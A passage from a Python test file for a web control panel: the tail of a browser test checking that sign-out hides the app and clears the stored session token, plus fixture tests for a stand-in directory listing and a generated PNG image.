        page = self.open()
        page.click("#cp-signout")
        page.wait_for_selector("#cp-gate:not(.hidden)")
        self.assertTrue(page.is_hidden("#cp-app"))
        self.assertEqual(page.evaluate("sessionStorage.getItem('symphony_panel_token')"), None)
        self.assertEqual(self.errors, [])


class Fixture(unittest.TestCase):
    """The stand-in's own shape, so a failing browser test is not the fixture's fault."""

    def test_the_listing_gives_direct_entries_only(self):
        top = listing("main", "")
        self.assertEqual([e["name"] for e in top if e["type"] == "dir"], [".github", "artifacts", "deep", "docs", "pictures"])
        self.assertIn("big.bin", [e["name"] for e in top])
        self.assertEqual([e["path"] for e in listing("main", "deep")], ["deep/inner"])
        self.assertIsNone(listing("main", "nope"))
        self.assertEqual([e["name"] for e in listing("board", "")], ["STATE.md"])

    def test_the_png_is_a_png(self):
        self.assertTrue(png_1x1().startswith(b"\x89PNG"))


if __name__ == "__main__":
    unittest.main()
